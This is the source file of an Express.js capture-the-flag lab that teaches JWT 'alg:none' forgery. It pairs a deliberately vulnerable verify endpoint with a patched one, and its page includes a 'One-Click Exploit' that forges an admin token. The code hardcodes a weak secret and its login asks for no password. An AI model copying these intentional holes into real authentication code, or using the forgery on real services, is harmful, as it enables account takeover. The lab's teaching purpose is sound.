const express = require('express');
const cors    = require('cors');
const crypto  = require('crypto');
const app     = express();
const PORT    = process.env.PORT || 5004;

const FRONTEND_URL = process.env.FRONTEND_URL || 'http://localhost:3000';
app.use(cors({ origin: FRONTEND_URL }));

app.use(express.json());


const SECRET = 'weak_secret_123';

function b64url(str) {
  return Buffer.from(str).toString('base64').replace(/=/g,'').replace(/\+/g,'-').replace(/\//g,'_');
}
function decB64url(str) {
  return Buffer.from(str.replace(/-/g,'+').replace(/_/g,'/'), 'base64').toString();
}
function hmacSign(data) {
  return crypto.createHmac('sha256', SECRET).update(data).digest('base64')
    .replace(/=/g,'').replace(/\+/g,'-').replace(/\//g,'_');
}

app.post('/api/login', (req, res) => {
  const { username } = req.body;
  const users = { alice: { id: 1, role: 'user' }, admin: { id: 99, role: 'admin' } };
  const u = users[username];
  if (!u) return res.status(401).json({ error: 'Unknown user. Try: alice or admin' });

  const header  = b64url(JSON.stringify({ alg: 'HS256', typ: 'JWT' }));
  const payload = b64url(JSON.stringify({ id: u.id, username, role: u.role, iat: Math.floor(Date.now() / 1000) }));
  const sig     = hmacSign(header + '.' + payload);

  res.json({ token: `${header}.${payload}.${sig}`, user: { username, role: u.role } });
});

app.post('/api/vulnerable/verify', (req, res) => {
  const { token } = req.body;
  if (!token) return res.status(400).json({ error: 'Token required' });
  try {
    const parts = token.split('.');
    if (parts.length !== 3) return res.status(400).json({ error: 'Invalid token format' });
    const header  = JSON.parse(decB64url(parts[0]));
    const payload = JSON.parse(decB64url(parts[1]));

    if (header.alg === 'none') {
      const flag = payload.role === 'admin' ? (process.env.JWT_FLAG || 'FLAG{jwt_none_algorithm_bypass}') : null;
      return res.json({ valid: true, bypassed: true, header, payload,
        message: 'Algorithm confusion bypass! Role: ' + payload.role, flag });
    }

    const expected = hmacSign(parts[0] + '.' + parts[1]);
    if (expected !== parts[2]) return res.status(401).json({ valid: false, error: 'Invalid signature' });
    res.json({ valid: true, bypassed: false, header, payload, message: 'Valid token. Role: ' + payload.role });
  } catch(e) { res.status(400).json({ error: 'Parse error: ' + e.message }); }
});

app.post('/api/patched/verify', (req, res) => {
  const { token } = req.body;
  if (!token) return res.status(400).json({ error: 'Token required' });
  try {
    const parts  = token.split('.');
    const header = JSON.parse(decB64url(parts[0]));
    if (header.alg === 'none') {
      return res.status(401).json({ valid: false, error: 'Algorithm "none" is not accepted by this server' });
    }
    const expected = hmacSign(parts[0] + '.' + parts[1]);
    if (expected !== parts[2]) return res.status(401).json({ valid: false, error: 'Signature verification failed' });
    const payload = JSON.parse(decB64url(parts[1]));
    res.json({ valid: true, payload, message: 'Valid. Role: ' + payload.role });
  } catch(e) { res.status(400).json({ error: 'Parse error: ' + e.message }); }
});

const HTML = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>AuthService - JWT Lab</title>
<script src="https://cdn.tailwindcss.com"><\/script>
<style>
body { font-family: 'Inter', sans-serif; background: #0f172a; color: #cbd5e1; }
pre { background: #1e293b; color: #94a3b8; padding: 1rem; border-radius: 8px; font-size: 0.75rem; overflow-x: auto; white-space: pre-wrap; }
.flag { background: #fef9c3; border: 2px solid #eab308; color: #713f12; padding: 0.75rem; border-radius: 8px; font-family: monospace; font-weight: 700; }
textarea, input, select { background: #1e293b !important; color: #cbd5e1 !important; border-color: #334155 !important; }
</style>
</head>
<body class="min-h-screen p-4 py-8">
<div class="max-w-4xl mx-auto space-y-6">
  <h1 class="text-2xl font-bold text-white text-center">JWT Token Manipulation Lab</h1>
  <div class="bg-amber-900/30 border border-amber-600 rounded-xl p-4">
    <p class="font-semibold text-amber-400 text-sm">JWT Alg:None Vulnerability</p>
    <p class="text-amber-300/70 text-xs mt-1">Get a token as alice → Click "One-Click Exploit" → Submit to get the flag.</p>
  </div>
  <div class="bg-slate-800 rounded-xl p-6 border border-slate-700">
    <h2 class="font-bold text-white mb-3">Step 1 — Get a Token</h2>
    <div class="flex gap-2 mb-3">
      <select id="login-user" class="flex-1 border rounded-lg px-3 py-2 text-sm"><option value="alice">alice (role: user)</option><option value="admin">admin (role: admin)</option></select>
      <button id="get-token-btn" class="bg-blue-600 text-white px-4 py-2 rounded-lg text-sm">Get Token</button>
    </div>
    <pre id="token-out">// Click Get Token</pre>
  </div>
  <div class="bg-slate-800 rounded-xl p-6 border border-slate-700">
    <h2 class="font-bold text-white mb-3">Step 2 — Forge the Token</h2>
    <div class="grid grid-cols-1 lg:grid-cols-3 gap-3 mb-4">
      <div><label class="text-xs text-gray-400 block mb-1">Header</label><textarea id="forge-header" rows="5" class="w-full border rounded-lg px-3 py-2 text-xs font-mono resize-none"></textarea></div>
      <div><label class="text-xs text-gray-400 block mb-1">Payload</label><textarea id="forge-payload" rows="5" class="w-full border rounded-lg px-3 py-2 text-xs font-mono resize-none"></textarea></div>
      <div><label class="text-xs text-gray-400 block mb-1">Signature</label><textarea id="forge-sig" rows="5" class="w-full border rounded-lg px-3 py-2 text-xs font-mono resize-none"></textarea></div>
    </div>
    <div class="flex gap-2 mb-3">
      <button id="one-click-btn" class="text-sm bg-red-600 text-white px-4 py-2 rounded font-semibold">⚡ One-Click Exploit</button>
      <button id="build-btn" class="text-xs bg-slate-700 text-gray-300 px-3 py-1.5 rounded">Build Token</button>
    </div>
    <pre id="forged-token" class="text-xs font-mono">// Get a token first</pre>
  </div>
  <div class="grid grid-cols-1 lg:grid-cols-2 gap-4">
    <div class="bg-slate-800 rounded-xl p-5 border border-red-900/40">
      <h3 class="font-semibold text-white mb-3 text-sm">🚨 Vulnerable (accepts alg:none)</h3>
      <textarea id="v-token-input" rows="3" class="w-full border rounded-lg px-3 py-2 text-xs mb-2 resize-none font-mono"></textarea>
      <button id="verify-vuln-btn" class="w-full bg-red-700 text-white py-2 rounded-lg text-sm mb-2">Submit</button>
      <pre id="v-verify-out">// Submit your forged token</pre>
      <div id="jwt-flag" class="flag hidden mt-3"></div>
    </div>
    <div class="bg-slate-800 rounded-xl p-5 border border-green-900/40">
      <h3 class="font-semibold text-white mb-3 text-sm">✅ Patched (rejects alg:none)</h3>
      <textarea id="p-token-input" rows="3" class="w-full border rounded-lg px-3 py-2 text-xs mb-2 resize-none font-mono"></textarea>
      <button id="verify-patch-btn" class="w-full bg-green-700 text-white py-2 rounded-lg text-sm mb-2">Submit</button>
      <pre id="p-verify-out">// Same token — should be rejected</pre>
    </div>
  </div>
</div>
<script>
function b64url(s){return btoa(unescape(encodeURIComponent(s))).replace(/=/g,'').replace(/\\+/g,'-').replace(/\\//g,'_');}
function decB64url(s){try{return JSON.parse(decodeURIComponent(escape(atob(s.replace(/-/g,'+').replace(/_/g,'/')))));}catch{return null;}}
document.getElementById('get-token-btn').addEventListener('click', doLogin);
document.getElementById('one-click-btn').addEventListener('click', oneClickExploit);
document.getElementById('build-btn').addEventListener('click', buildToken);
document.getElementById('verify-vuln-btn').addEventListener('click', verifyVuln);
document.getElementById('verify-patch-btn').addEventListener('click', verifyPatched);
async function doLogin(){
  const u=document.getElementById('login-user').value;
  try{const r=await fetch('/api/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:u})});
  const d=await r.json();if(d.token){document.getElementById('token-out').textContent='Token: '+d.token;const p=d.token.split('.');document.getElementById('forge-header').value=JSON.stringify(decB64url(p[0]),null,2);document.getElementById('forge-payload').value=JSON.stringify(decB64url(p[1]),null,2);document.getElementById('forge-sig').value=p[2];}else{document.getElementById('token-out').textContent=JSON.stringify(d,null,2);}}catch(e){document.getElementById('token-out').textContent='Error: '+e.message;}
}
function oneClickExploit(){
  const ps=document.getElementById('forge-payload').value;if(!ps.trim()){document.getElementById('forged-token').textContent='⚠️ Get a token first.';return;}
  let p={};try{p=JSON.parse(ps);}catch(e){document.getElementById('forged-token').textContent='Error: '+e.message;return;}
  p.role='admin';document.getElementById('forge-header').value=JSON.stringify({alg:'none',typ:'JWT'},null,2);document.getElementById('forge-payload').value=JSON.stringify(p,null,2);document.getElementById('forge-sig').value='';buildToken();
}
function buildToken(){
  try{const h=JSON.parse(document.getElementById('forge-header').value);const p=JSON.parse(document.getElementById('forge-payload').value);const s=document.getElementById('forge-sig').value.trim();const t=b64url(JSON.stringify(h))+'.'+b64url(JSON.stringify(p))+'.'+(s||'');document.getElementById('forged-token').textContent=t;document.getElementById('v-token-input').value=t;document.getElementById('p-token-input').value=t;}catch(e){document.getElementById('forged-token').textContent='Error: '+e.message;}
}
async function verifyVuln(){
  const token=document.getElementById('v-token-input').value.trim();if(!token)return;
  try{const r=await fetch('/api/vulnerable/verify',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({token})});const d=await r.json();document.getElementById('v-verify-out').textContent=JSON.stringify(d,null,2);if(d.flag){const fl=document.getElementById('jwt-flag');fl.textContent='🏁 Flag: '+d.flag;fl.classList.remove('hidden');}}catch(e){document.getElementById('v-verify-out').textContent='Error: '+e.message;}
}
async function verifyPatched(){
  const token=document.getElementById('p-token-input').value.trim();if(!token)return;
  try{const r=await fetch('/api/patched/verify',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({token})});const d=await r.json();document.getElementById('p-verify-out').textContent=(r.ok?'✅ ':'🚫 HTTP '+r.status+' — ')+JSON.stringify(d,null,2);}catch(e){document.getElementById('p-verify-out').textContent='Error: '+e.message;}
}
<\/script>
</body></html>`;

app.get('/', (req, res) => res.send(HTML));
app.listen(PORT, () => console.log(`🔑 JWT Lab running on port ${PORT}`));